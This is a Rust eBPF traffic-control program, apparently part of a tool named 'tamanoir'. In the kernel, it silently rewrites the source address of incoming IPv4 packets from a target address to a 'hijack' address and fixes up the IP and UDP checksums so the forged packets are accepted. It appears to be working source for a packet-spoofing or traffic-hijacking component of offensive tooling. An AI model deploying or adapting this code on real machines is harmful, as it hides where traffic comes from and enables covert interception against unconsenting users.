use aya_ebpf::{
    bindings::TC_ACT_PIPE, cty::c_void, helpers::bpf_skb_store_bytes, macros::classifier,
    programs::TcContext,
};
use aya_log_ebpf::{error, info};
use network_types::{
    eth::{EthHdr, EtherType},
    ip::Ipv4Hdr,
};

use crate::common::{HIJACK_IP, IP_CSUM_OFFSET, IP_SRC_ADDR_OFFSET, TARGET_IP, UDP_CSUM_OFFSET};

#[classifier]
pub fn tamanoir_ingress(ctx: TcContext) -> i32 {
    match tc_process_ingress(ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

#[inline]
fn tc_process_ingress(ctx: TcContext) -> Result<i32, ()> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };

    let ethhdr: EthHdr = ctx.load(0).map_err(|_| ())?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN).map_err(|_| ())?;
        let src_addr = u32::from_be(header.src_addr);
        if src_addr == target_ip {
            let hijack_ip_mut = &mut hijack_ip.to_be() as *mut u32;

            let skb = &ctx.skb;

            info!(
                &ctx,
                "ipcsum: {}  udpcsum: {}",
                u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
                u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
            );

            // recompute l3 and l4 checksums
            if let Err(err) = (*skb).l3_csum_replace(
                IP_CSUM_OFFSET,
                header.src_addr as u64,
                hijack_ip.to_be() as u64,
                4,
            ) {
                error!(&ctx, "error: {}", err);
            }
            // src addr part for udphdr
            if let Err(err) = (*skb).l4_csum_replace(
                UDP_CSUM_OFFSET,
                header.src_addr as u64,
                hijack_ip.to_be() as u64,
                20,
            ) {
                error!(&ctx, "error: {}", err);
            }

            info!(
                &ctx,
                "=> ipcsum: {}  udpcsum: {}",
                u16::from_be(ctx.load::<u16>(IP_CSUM_OFFSET).unwrap()),
                u16::from_be(ctx.load::<u16>(UDP_CSUM_OFFSET).unwrap())
            );

            if unsafe {
                bpf_skb_store_bytes(
                    skb.skb,
                    IP_SRC_ADDR_OFFSET as u32,
                    hijack_ip_mut as *const c_void,
                    4,
                    2,
                )
            } < 0
            {
                error!(&ctx, "error writing new address ");
            }
        };
    };

    Ok(TC_ACT_PIPE)
}
